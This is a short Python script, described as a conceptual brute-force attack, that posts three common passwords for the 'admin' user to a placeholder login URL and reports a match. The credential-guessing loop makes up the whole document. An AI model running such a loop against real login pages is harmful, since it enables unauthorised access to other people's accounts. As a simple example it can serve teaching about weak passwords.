# Conceptual brute force password attack (DO NOT USE MALICIOUSLY)
import requests

url = "http://example.com/login"
passwords = ["1234", "password", "admin"]

for password in passwords:
    response = requests.post(url, data={"username": "admin", "password": password})
    if "Welcome" in response.text:
        print(f"Password found: {password}")
        break
